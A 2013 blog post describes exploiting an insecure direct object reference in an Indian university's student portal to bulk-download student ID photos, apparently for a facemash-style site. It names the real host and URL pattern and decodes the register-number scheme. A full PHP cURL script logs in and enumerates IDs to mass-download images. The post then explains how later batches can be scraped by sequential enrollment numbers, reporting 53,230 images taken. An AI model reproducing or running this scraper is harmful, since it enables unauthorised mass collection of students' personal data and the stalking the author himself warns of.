---
layout: post
title:  "NerdOrNot"
date:   2013-05-17 22:49:07
categories: facemash
---

Let's dive into how I got the Images. Pretty Simple Really. If you log into your ERP account you will see your passport sized image with you basic information. If you try right clicking it and opening the image in a new tab, you can something like this in the address bar.

`http://evarsity.srmuniv.ac.in/srmswi/LoadImageInJsp.jsp?imagepath=/usr/local/StudentPhoto/2010/10z10y00xx.jpg`

Let's break this down. You can see 2010 in there, which is the my year of joining and '10z10y00xx' which is apparently my register number. I was a little bored last night so changed the register number at the end of the URL to 10z10y00x(x+1).jpg and guess what? I was able to see my friend's picture as well. What did this mean? Well.. I can now access every fourth your student's image from the SRM database.

<img src="https://db.tt/wonRrgOL" class="full-screen" /> 

Any person, anywhere around the world with a valid SRM login-id and password has access to all your photos. Not only that with the register number, he will be able to assosiate your photo with your campus, your department and your class. A stalker's paradise indeed.

The stalker might not know everyone's name, but will know your face. By using any one of the multiple facial recognintion software on the internet, he will be able to match your face with a facebook profile. He will then have access to your all your public information, your hobbies, your activities, your likes, your dislikes. A harrasment suite waiting to happen. The importance of this information is much more than one would think.

Let's consider an example register number- 1011010012

* 101 - Department ID (101-Civil, 102-Mechanical, 104-CSC, 108-IT and so on)
* 10 - Year of joining (2010)
* 1 - Campus (1-Ktr,2-Rrm,3-Modi and so on)
* 0012 - Your number in your class

{% highlight php %} 
$file = 'cookies.txt';
file_put_contents($file,'');
require_once('curl.php');
require_once('simple_html_dom.php');	
$cc = new cURL(); 
if($data = $cc->get('evarsity.srmuniv.ac.in/srmswi/usermanager/
youLogin.jsp?txtSN=10z10y00xx&txtPD=mypassword&txtPA=1'))
{	
$html = str_get_html($data);
if($html->find('div[class=paneltitle01]'))
{
for($i=1;$i<18;$i++){
if($i<10)
$dept = "0".$i;
else
$dept = $i;			
$max = 400;
for($j=1;$j<=3;$j++){
for($k=1;$k<$max;$k++){
if($k<10)
$roll = "00".$k;
else if($k<100)
$roll = "0".$k;
else
$roll = $k;
if($data = $cc->get("http://evarsity.srmuniv.ac.in/srmswi/
LoadImageInJsp.jsp?imagepath=/usr/local/StudentPhoto/
2010/1".$dept."10".$j."0".$roll.".jpg")){
  if($data!=null)
  {
    $file = "1".$dept."10".$j."0".
    $roll.'.jpg';
  if(!is_file($file))
  {
    $fp = 
    fopen('images/'.$file,'w');
    echo $file."\n";
    fwrite($fp, $data); 
    fclose($fp);	
  }

  }
}}}}}}
{% endhighlight %}


Now that this information is out there for free, let's get it! Check out this script on the right. Basic php Curl, straight forward stuff. Curl to the url as specified earlier, write the data recieved in a JPG file as, I've demonstrated and you are good to go. Iterate from 101 to 117, the various departments. 101-103 the three campuses and from 1 to 400(I've made an assumption here that the maximum number of students per department per campus is 400). This script will run for an hour or so. At the end of it, you will have nearly 3k images of all SRM fourth year students.

* * *

<img src="https://db.tt/16eIH8LC" class="full-screen" />

Are we done? No way. Just change the url to 2009 and the 2nd unit of the register number to 09 and you will get another set of 3k pictures, the batch of 2009. 2008 doesn't work, I guess they must have removed those from the server. Nothing we can do about that.

Now from 2011, it's a little tricky. I guess the tech team at SRM realized how dangerous their picture storing scheme was. Did you know that when you reigster during councelling, SRM gives you a six digit enrollment number. You can even use that to log into the ERP. Well the reason, I'm talking about that is from the batch of 2011 this number is used to save everyone's picture not their register number. Coming to think of it, it's a much safer scheme as now even if a stalker gets hold of all your pictures, he will now know which campus you study in, which department you belong to or how old you are.

Some secuiry is better than no security right? Great going SRM, you are halfway there!

* * *

<img src="https://db.tt/I1jf6FQz" class="full-screen" />

`http://evarsity.srmuniv.ac.in/srmswi/LoadImageInJsp.jsp?imagepath=/usr/local/StudentPhoto/2011/S_123586.jpg`

Now fetching the images is actually easier. As now all Images are stored sequentially. You have to estimate the limts per year, but that has to be done manually. You will figure out that images of students belonging to the batch of 2011 ranges from S_123586.jpg to S_144221.jpg. Similarly estimate limits for 2012 and 2013, modify the previous script a little and Wala. After 7 and a half hours, you have a 1.4gb folder, containing 53,230 images.

`#kThankxbai`

* * *

[Github](https://github.com/nithinkrishna/nerdornot).
[Website](http://nerdornot-srmapi.rhcloud.com/).
[Screen Shot](https://db.tt/Rvb38IHP)